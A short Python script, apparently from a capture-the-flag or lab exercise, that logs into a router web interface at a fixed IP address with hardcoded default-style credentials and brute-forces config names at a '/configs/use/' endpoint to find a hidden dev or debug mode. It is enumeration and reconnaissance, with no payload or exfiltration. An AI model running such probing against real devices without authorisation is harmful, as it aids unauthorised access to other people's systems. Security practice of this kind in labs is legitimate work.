#!/usr/bin/env python3
# Try various config names that might enable dev mode

import requests

URL = "http://154.57.164.66:30817"
AUTH = ("admin", "router123")

# Try to use various config names
configs = ["dev", "debug", "test", "development", "admin", "rweb", "root"]
for cfg in configs:
    r = requests.get(f"{URL}/configs/use/{cfg}", auth=AUTH, timeout=3)
    print(f"GET /configs/use/{cfg}: {r.status_code}")
    if r.status_code == 200 and "Config does not exist" not in r.text:
        print(f"  Found config: {cfg}")

# Check if there's a list configs endpoint
print("\n=== GET /configs/list ===")
r = requests.get(f"{URL}/configs/list", auth=AUTH, timeout=3)
print(f"Status: {r.status_code}")

# Try to find any hidden configs by brute forcing
print("\n=== Brute force common config names ===")
for cfg in ["default", "production", "config", "main", "router", "settings"]:
    r = requests.get(f"{URL}/configs/use/{cfg}", auth=AUTH, timeout=2)
    if "Config does not exist" not in r.text:
        print(f"Config '{cfg}' exists!")